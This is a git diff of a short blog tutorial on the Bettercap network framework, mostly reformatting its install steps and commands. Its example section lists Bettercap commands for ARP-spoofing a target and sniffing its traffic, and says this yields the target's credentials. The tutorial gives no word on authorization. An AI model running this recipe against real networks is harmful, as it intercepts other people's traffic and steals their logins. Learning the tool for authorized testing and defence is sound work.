@@ -2,6 +2,7 @@
 title: "Bettercap"
 date: 2022-07-02T18:16:26Z
 draft: false
+author: "Dark-Kernel"
 ---
 
 ## Bettercap Framework
@@ -35,15 +36,15 @@ To install bettercap use the following commands:
 
 ~ Arch
 
-`sudo pacman -S bettercap`
+	sudo pacman -S bettercap
 
 ~ Kali
 
-` sudo apt install bettercap `
+	sudo apt install bettercap
 
 ~ Others use their official repository
 
-`https://github.com/bettercap/bettercap`
+	https://github.com/bettercap/bettercap
 
 
 ## Basic stuffs
@@ -51,48 +52,50 @@ To install bettercap use the following commands:
 
 First fireup you bettercap on terminal
 
-`sudo bettercap`
+	sudo bettercap
 
-![bettercap_start](btr_start.png)
+![bettercap_start](/btr_start.png)
 
 
-<br>
+
 Search devices on your network
 
-`net.probe on`
+	net.probe on
 
-`net.show`
+	net.show
 
   
-<br>
+
 You can perform MITM attack also 
-Example
+### Example
 
-1. `set arp.spoof.fullduplex true`
+	set arp.spoof.fullduplex true
 
-2. `set arp.spoof.targets <target ip>`
+ 	set arp.spoof.targets <target ip>
 
-3. `arp.spoof on`
+ 	arp.spoof on
 
-4. `net.sniff on`
+ 	net.sniff on
 
 
 Now you will get all the data where the target visits. including the credentials.
-<br>
 
 
-#**We can use web view also**
+
+# 
+# **We can use web view also**
 
    1. First install ui
 
- `ui.update`
+ 	ui.update
 
    2. Then 
 
- `https-ui`
+ 	https-ui
 
  Now you will get a link visit that page and explore.
 
+
         
-**Thanks for reading.**
+# **Thanks for reading.**
 
